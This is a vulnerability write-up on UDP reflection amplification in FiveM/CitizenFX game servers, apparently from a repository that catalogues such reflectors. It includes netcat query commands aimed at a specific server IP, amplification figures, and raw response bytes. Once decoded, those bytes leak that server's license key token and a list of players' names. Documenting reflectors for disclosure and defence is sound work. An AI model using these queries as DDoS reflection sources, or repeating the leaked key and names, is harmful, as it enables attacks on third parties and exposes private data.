# FiveM (Grand Theft Auto 5 FXServer) / CitizenFX

## Port: 30120

## Proto: UDP

## Amplification factor: ~8-15x (~30x with `getstatus` depending on players)

## Reflector count: ~5,000 (4,100 over 100 bytes response)

---

## Edit: This weakness has been patched via a rate limiter: https://github.com/citizenfx/fivem-docs/issues/99

---

- *cough is it just me or has quake3 netcode been rebooted*
- A flavour of GTAV (also Max Payne and some potential others) with "modifications" and multiplayer based on CitizenFX server quake server (?) edit, allowing the use of dedicated servers to host your own GTAV experience.
- It supports LUA and Node on both server and client.
- Vulnerable to CWE-406 as per usual in this repo.
  - [Problem 1 Code: GetInfoOOB](https://github.com/citizenfx/fivem/blob/master/code/components/citizen-server-impl/src/GameServer.cpp#L1052)
  - [Problem 2 Code: GetStatusOOB](https://github.com/citizenfx/fivem/blob/master/code/components/citizen-server-impl/src/GameServer.cpp#L1103)
    - **infoVars.str()** and **clientList.str()** are sent without challenge token as properly implemented in A2S_PLAYER: <https://developer.valvesoftware.com/wiki/Server_queries#A2S_PLAYER>

### Example Requests / Responses

#### GetInfoOOB Request

- Request: 11 bytes

  - ASCII: `getinfo`

  - `> ~# echo -ne '\xff\xff\xff\xffgetinfo'|nc -u 94.23.28.219 30120 -w2`

- Response: Avg 250 bytes (differs greatly on custom server name)

  - ASCII character space: `����infoResponse
\sv_maxclients\32\clients\1\challenge\xxx\gamename\CitizenFX\protocol\4\hostname\^4 [^0FR^1]  🌄^8Auria^8RP   ^9| 🌍 ^2Free-Acces - ^1100K Start 👊 ^9| 📺 ^5 100 FPS+^9 | ^6📁 Scripts & Mappings ^9|^3💎Staff-Actif |^7😈Gang/job^7 🔊^8discord.gg/es3ccJQ^9|\gametype\Freeroam\mapname\Auria_Map_\iv\1081559699`
  - Raw Bytes: `ffffffff696e666f526573706f6e73650a5c73765f6d6178636c69656e74735c33325c636c69656e74735c315c6368616c6c656e67655c787878005c67616d656e616d655c436974697a656e46585c70726f746f636f6c5c345c686f73746e616d655c5e34205b5e3046525e315d2020f09f8c845e3841757269615e3852502020205e397c20f09f8c8d205e32467265652d4163636573202d205e313130304b20537461727420f09f918a205e397c20f09f93ba205e3520313030204650532b5e39207c205e36f09f938120536372697074732026204d617070696e6773205e397c5e33f09f928e53746166662d4163746966207c5e37f09f988847616e672f6a6f625e3720f09f948a5e38646973636f72642e67672f65733363634a515e397c5c67616d65747970655c46726565726f616d5c6d61706e616d655c41757269615f4d61705f5c69765c31303831353539363939`

#### GetStatusOOB Request

- Request: 13 bytes

  - ASCII: `getstatus`

  - `> ~# echo -ne '\xff\xff\xff\xffgetstatus'|nc -u 94.23.28.219 30120 -w2`

- Response: Avg 1200 bytes (differs on players currently playing)

  - ASCII character space: `too much text!`

  - Raw bytes: `ffffffff737461747573526573706f6e73650a5c73765f6d6178636c69656e74735c32345c636c69656e74735c31385c62616e6e65725f636f6e6e656374696e675c68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3638303339373537313233353235303335342f3639313631303136323639393536373134342f61757269615f62616e6e69657265322e6a70675c62616e6e65725f64657461696c5c68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3638303339373537313233353235303335342f3639313631303136323639393536373134342f61757269615f62616e6e69657265322e6a70675c446973636f72645c646973636f72642e67672f373467796e47775c44c3a976656c6f70706575725cf09f92bb20576f776d696b655f23313038372026204f6c6669726e61233435323120f09f92bb5c457461745c4f75766572745c67616d656e616d655c677461355c6c6f63616c655c66722d46525c6f6e6573796e635f656e61626c65645c66616c73655c73765f656e68616e636564486f7374537570706f72745c747275655c73765f686f73746e616d655c5e34205b5e3046525e315d2020f09f8c845e3841757269615e3852502020205e397c20f09f8c8d205e32467265652d4163636573202d205e313130304b20537461727420f09f918a205e397c20f09f93ba205e3520313030204650532b5e39207c205e36f09f938120536372697074732026204d617070696e6773205e397c5e33f09f928e53746166662d4163746966207c5e37f09f988847616e672f6a6f625e3720f09f948a5e38646973636f72642e67672f65733363634a515e397c5c73765f696e666f56657273696f6e5c313133343138363133355c73765f6c616e5c66616c73655c73765f6c6963656e73654b6579546f6b656e5c6968373639306c74697a637a683876715f3435393330323a653665346536636237656637393364303634383235303637646630366663616238303032623861353038643331323365616334303438393461366434366134375c73765f6d6178436c69656e74735c33325c73765f736372697074486f6f6b416c6c6f7765645c66616c73655c746167735c4553582c726f6c65706c61792c63617274652d73696d2c52702c47616e672c66722c536572696575782d72702c46522c536572696575782c52502c45636f6e6f6d69650a3020302022416c657820436861726f6e220a30203020224d65686469204d657373616f756469220a30203020224a65616e2d4261707469737465204b697269220a30203020225068696c69706520416275646f220a30203020224962726168696d205a616c6168220a3020302022536f6669616e65205a616c6168220a302030202253616e476f4c65446f5a6f220a30203020224d6178696d65204d61726b77616c646572220a3020302022446a6f204361726c6f220a302030202259616e6973204c75636369617469220a30203020224b6169697430220a302030202244796c616e20626174220a30203020224d6178204c6f6e6579220a30203020224b6172696d204b6961726f220a30203020224172692044656c61636f6e6465220a302030202257696c6c69616d204368656b65727370656172220a3020302022526179616e20416e646572736f6e220a3020302022796d6174726174220a`


### Documentation

- FiveM Main Site <https://fivem.net/>
- CitizenFX's Github <https://github.com/citizenfx>
  - Their own use of the query: <https://github.com/citizenfx/fivem/blob/master/code/components/nui-gsclient/src/ServerList.cpp#L263>
- Running FXServer <https://docs.fivem.net/docs/server-manual/setting-up-a-server/>
- List of Public Servers <https://servers.fivem.net/servers>

### Mitigations

- Vendor issue, CitizenFX will need to address it otherwise will just be left exposed and free to use as an amplification source.
- Very similar to the still-existing Quake3 netcode problem and same amplification rates.